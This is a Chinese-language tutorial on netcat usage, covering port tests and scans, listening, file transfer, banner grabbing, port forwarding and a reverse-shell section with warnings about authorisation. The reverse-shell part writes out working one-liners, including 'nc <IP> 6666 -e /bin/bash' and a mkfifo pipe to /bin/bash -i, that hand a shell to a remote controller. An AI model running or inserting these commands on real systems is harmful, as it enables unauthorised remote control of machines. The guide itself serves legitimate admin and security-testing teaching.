# nc（Netcat）命令 核心用法全解
nc 全称 **Netcat**，是Linux/Unix系统中被誉为「网络瑞士军刀」的轻量级网络工具，基于TCP/UDP协议工作，可实现端口测试、监听通信、文件传输、反向Shell等核心功能，是网络调试、运维、安全测试的必备工具。

---

## 一、前置准备：安装与核心基础
### 1. 安装命令
绝大多数Linux发行版可直接通过包管理器安装，主流推荐`netcat-openbsd`版本（兼容性更强）：
```bash
# Ubuntu/Debian 系统
sudo apt update && sudo apt install netcat-openbsd

# CentOS/RHEL 系统
sudo yum install nc
# 或 sudo dnf install nmap-ncat
```

### 2. 核心语法格式
```bash
nc [参数] 目标主机 端口/端口范围
```

### 3. 必学核心参数（含英文全称+释义）
严格遵循你的学习习惯，所有参数均标注缩写来源：
| 参数 | 英文全称 | 核心释义 |
| :--- | :--- | :--- |
| `-l` | `--listen` | 开启监听模式，作为服务端接收传入连接 |
| `-p` | `--source-port` | 指定本地使用的源端口 |
| `-s` | `--source` | 指定本地发送数据包的源IP（多网卡场景用） |
| `-u` | `--udp` | 使用UDP协议（默认使用TCP协议） |
| `-v` | `--verbose` | 输出详细执行信息，调试必备 |
| `-vv` | - | 比`-v`更详细的交互细节输出 |
| `-z` | `--zero-I/O` | 零IO模式，仅扫描端口是否开放，不发送数据，端口扫描专用 |
| `-n` | `--numeric` | 不进行DNS域名解析，直接使用IP，加快执行速度 |
| `-w` | `--wait` | 设置超时时间（单位：秒），超时无响应则断开 |
| `-k` | `--keep-open` | 保持监听开启，当前连接断开后仍可接收新连接 |
| `-e` | `--exec` | 执行指定程序/命令，将输入输出重定向到网络连接（反向Shell常用） |
| `-c` | `--sh-exec` | 执行shell命令，兼容无`-e`参数的OpenBSD版本 |

## 二、入门必学：最常用基础用法
### 1. 端口连通性测试（替代telnet，日常最高频）
这是nc最基础、最常用的功能，替代日渐淘汰的telnet，快速验证目标端口是否开放。
#### （1）TCP端口测试
```bash
# 核心命令
nc -zv 目标主机 目标端口

# 示例
nc -zv 192.168.1.100 22    # 测试目标主机SSH 22端口是否开放
nc -zv www.baidu.com 80     # 测试百度80端口是否开放
```
- 成功输出：`succeeded!` 字样，代表端口开放且可连通
- 失败输出：`Connection refused`，代表端口关闭或防火墙拦截

#### （2）UDP端口测试
UDP是无连接协议，需加`-u`参数指定协议：
```bash
# 核心命令
nc -zuv 目标主机 目标端口

# 示例：测试DNS服务器53 UDP端口连通性
nc -zuv 114.114.114.114 53
```
> 注意：UDP无握手机制，默认输出成功不代表绝对连通，建议配合下文的UDP监听通信做双向验证。

### 2. 批量端口扫描
快速排查目标主机开放的端口，仅可在**你拥有合法授权**的主机/网络内使用。
```bash
# 核心命令：扫描连续端口范围
nc -zvn 目标主机 起始端口-结束端口

# 示例1：扫描192.168.1.100的20-100号TCP端口
nc -zvn 192.168.1.100 20-100

# 示例2：扫描指定的多个离散端口
nc -zvn 192.168.1.100 22 80 443 3306
```
- `-n`：跳过DNS解析，大幅提升扫描速度
> 法律风险提示：未经授权的端口扫描违反《网络安全法》，严禁对公网非授权主机执行。

## 三、进阶实操：核心场景用法
### 1. TCP/UDP 双向通信（简易聊天/服务调试）
通过nc搭建C/S架构的通信通道，可快速验证TCP/UDP服务的通信能力，也能实现简易的跨主机聊天。

#### （1）TCP模式通信
- 步骤1：**服务端**开启监听（本机执行，等待客户端连接）
  ```bash
  nc -lvp 8888
  # 加 -k 参数可保持监听，连接断开后不退出：nc -lkvp 8888
  ```
- 步骤2：**客户端**连接服务端（另一台主机执行）
  ```bash
  nc 服务端IP 8888
  ```
- 效果：连接成功后，两端输入的内容会实时互发，按`Ctrl+C`断开连接。

#### （2）UDP模式通信
仅需添加`-u`参数，适配无连接的UDP协议：
- 服务端：`nc -luvp 9999`
- 客户端：`nc -u 服务端IP 9999`

### 2. 跨主机文件/文件夹传输（应急神器）
无ssh/ftp/scp环境下，可通过nc快速传输文件/文件夹，无需额外依赖。

#### （1）单文件传输（推荐：接收端先启动）
- 步骤1：**接收端**开启监听，将收到的数据写入文件
  ```bash
  nc -lvp 7777 > 接收后的文件名
  # 示例：nc -lvp 7777 > test.tar.gz
  ```
- 步骤2：**发送端**连接接收端，推送本地文件
  ```bash
  nc 接收端IP 7777 < 要发送的文件名
  # 示例：nc 192.168.1.100 7777 < test.tar.gz
  ```
- 传输完成后两端自动断开，可通过`md5sum`校验文件完整性。

#### （2）文件夹直接传输（无需打包）
配合tar命令，直接传输并解压文件夹，无中间文件：
- 接收端：`nc -lvp 7777 | tar -zxvf -`
- 发送端：`tar -zcvf - 目标文件夹名 | nc 接收端IP 7777`

### 3. 服务Banner抓取（版本探测/调试）
很多服务连接后会返回版本信息（Banner），nc可快速抓取，用于服务识别、调试web/数据库服务。
```bash
# 示例1：抓取SSH服务版本Banner
nc -v 192.168.1.100 22

# 示例2：抓取HTTP服务Header信息
nc -v www.baidu.com 80
# 连接成功后输入以下内容，按2次回车
GET / HTTP/1.0
```

### 4. 简易端口转发/流量代理
通过nc实现轻量级端口转发，将本地端口的流量转发到远程目标，应急场景替代nginx/iptables转发。
```bash
# 示例：将本地8080端口的TCP流量，转发到百度80端口
nc -lkvp 8080 -c 'nc www.baidu.com 80'
```
执行后，访问本机8080端口，即可访问百度的80端口服务。

### 5. 反向Shell（授权运维/安全测试专用）
nc最核心的进阶功能，常用于内网主机远程运维（被控端无公网IP，无法直接连接）。
> 安全红线：仅可在你拥有完全合法授权的主机上使用，未经授权的远程控制属于刑事犯罪。

#### 核心原理
控制端（你的机器）开启监听，被控端（目标主机）主动发起连接，将自身的Shell输入输出重定向到网络连接，实现控制端远程执行命令。

#### 操作步骤
1. **控制端**先开启监听，等待连接：
   ```bash
   nc -lvp 6666
   ```
2. **被控端**执行反向连接命令，分两种兼容版本：
   - 版本1：传统nc版本（带`-e`参数）
     ```bash
     # Linux被控端
     nc 控制端IP 6666 -e /bin/bash
     # Windows被控端
     nc 控制端IP 6666 -e cmd.exe
     ```
   - 版本2：OpenBSD版本（无`-e`参数，Ubuntu默认版本，通用兼容）
     ```bash
     rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 控制端IP 6666 > /tmp/f
     ```
3. 连接成功后，控制端即可直接输入命令，远程操控被控端。

## 四、避坑指南与注意事项
1. **版本差异**：`netcat-openbsd`和`netcat-traditional`参数存在差异，`-e`参数在OpenBSD版本默认禁用，优先使用管道命令实现反向Shell，兼容性更强。
2. **权限限制**：监听1024以下的系统特权端口，必须使用root权限（加`sudo`）。
3. **网络拦截**：连接失败时，优先检查目标主机的防火墙（ufw/firewalld/iptables）是否放通对应端口，以及SELinux/AppArmor是否拦截。
4. **UDP特性**：UDP无连接、无重传机制，端口测试成功不代表服务正常，必须通过双向数据传输验证。
5. **法律合规**：所有扫描、远程控制操作，仅可在自身拥有授权的网络和主机内执行，严禁对公网非授权资产操作。

## 五、核心场景速记
| 日常场景 | 核心命令模板 |
| :--- | :--- |
| 端口连通性测试 | `nc -zv 目标IP 端口` |
| 服务端监听通信 | `nc -lvp 端口` |
| 应急文件传输 | 接收端`nc -lvp 端口 > 文件名`，发送端`nc 接收端IP 端口 < 文件名` |
| 端口扫描 | `nc -zvn 目标IP 端口范围` |
| 反向Shell | 控制端`nc -lvp 端口`，被控端执行对应连接命令 |
